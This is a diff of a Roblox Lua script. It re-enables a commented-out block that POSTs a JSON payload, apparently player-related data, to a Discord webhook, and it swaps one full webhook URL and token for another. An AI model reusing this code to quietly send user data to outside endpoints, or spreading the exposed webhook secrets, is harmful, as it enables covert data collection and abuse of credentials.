@@ -1,7 +1,7 @@
 --!nolint
 --!nocheck
 
---[[local Players = game:GetService("Players")
+local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 local Admins = {
@@ -147,7 +147,7 @@ local payload = {
 }
 
 local httpRequest = {
-	Url = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2",
+	Url = "https://discord.com/api/webhooks/1326001145415602247/T2tmiG-fO7R-UPT3TiXF-XFwOZ9qhNX9_Gt7LjVBr3Pz2a9-3UhghUt8iTwTyDddBFvW",
 	Method = "POST",
 	Headers = {
 		["Content-Type"] = "application/json"
@@ -155,4 +155,4 @@ local httpRequest = {
 	Body = game:GetService("HttpService"):JSONEncode(payload)
 }
 
-request(httpRequest)]]
+request(httpRequest)
